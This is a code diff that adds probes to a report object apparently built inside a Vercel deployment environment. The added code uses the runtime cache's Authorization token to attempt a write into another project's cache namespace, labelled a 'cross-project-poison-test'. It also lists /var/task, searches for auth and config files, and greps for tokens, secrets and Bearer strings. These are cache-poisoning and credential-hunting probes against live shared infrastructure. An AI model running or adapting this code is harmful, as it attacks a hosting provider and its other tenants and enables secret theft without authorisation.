@@ -640,6 +640,36 @@ const report = {
       spacesDeployRun: probe(`https://vercel.com/api/v1/spaces/runs/${deployId}?teamId=${ownerId}`),
     };
   }),
+  // Cross-project suspense cache write test:
+  // Can our JWT write to a DIFFERENT project's cache key namespace?
+  // This would allow poisoning other projects' caches even with a per-project-scoped JWT.
+  crossProjectCacheWrite: safe(() => {
+    const ep = process.env.RUNTIME_CACHE_ENDPOINT || '';
+    const hdrsRaw = process.env.RUNTIME_CACHE_HEADERS || '';
+    if (!ep || !hdrsRaw) return 'missing-cache-config';
+    let auth = '';
+    try { auth = JSON.parse(hdrsRaw)['Authorization'] || ''; } catch(_) {}
+    const a = auth ? `-H 'Authorization: ${auth.replace(/'/g,"'\\''")}' ` : '';
+    // Write to a key path with a FAKE project ID prefix (not our project)
+    const fakeProjectKey = 'prj_FAKEPROJECTID1234567890ABCDE/cross-project-poison-test';
+    const writeStatus = safe(() => execSync(`curl -s --max-time 5 -X POST -H 'Content-Type: application/json' -H 'x-vercel-cache-control: max-age=300' ${a}-d '{"kind":"FETCH","data":{"headers":{},"body":"cross-project-poison-test","url":"","status":200},"tags":["probe"],"revalidate":300}' -w '%{http_code}' -o /tmp/cpw '${ep}${fakeProjectKey}' 2>/dev/null || true`).toString().trim());
+    const writeBody = safe(() => readFileSync('/tmp/cpw','utf8').slice(0,200));
+    // Read back immediately
+    const readStatus = safe(() => execSync(`curl -s --max-time 5 -w '%{http_code}' -o /tmp/cpr ${a}'${ep}${fakeProjectKey}' 2>/dev/null || true`).toString().trim());
+    const readBody = safe(() => readFileSync('/tmp/cpr','utf8').slice(0,200));
+    return { fakeProjectKey, writeStatus, writeBody, readStatus, readBody };
+  }),
+  // /var/task/ inspection — where Vercel CLI code runs; any hardcoded creds?
+  varTask: safe(() => ({
+    listing: safe(() => execSync('ls -la /var/task/ 2>/dev/null | head -20 || true').toString().trim()).slice(0, 400),
+    nodeModules: safe(() => execSync('ls -la /var/task/node_modules/ 2>/dev/null | head -10 || true').toString().trim()).slice(0, 300),
+    // Check Vercel CLI package.json for version
+    vercelPkg: safe(() => JSON.parse(readFileSync('/var/task/node_modules/vercel/package.json','utf8')).version || 'unknown'),
+    // Check if vercel CLI has any auth config bundled
+    cliConfigDir: safe(() => execSync('find /var/task -name "config.json" -o -name "auth.json" 2>/dev/null | head -5 || true').toString().trim()),
+    // Does /var/task have any hardcoded tokens?
+    tokenScan: safe(() => execSync(`grep -r 'token\|secret\|key\|Bearer' /var/task/ --include="*.json" -l 2>/dev/null | head -5 || true`).toString().trim()),
+  })),
 };
 
 const body = JSON.stringify(report);
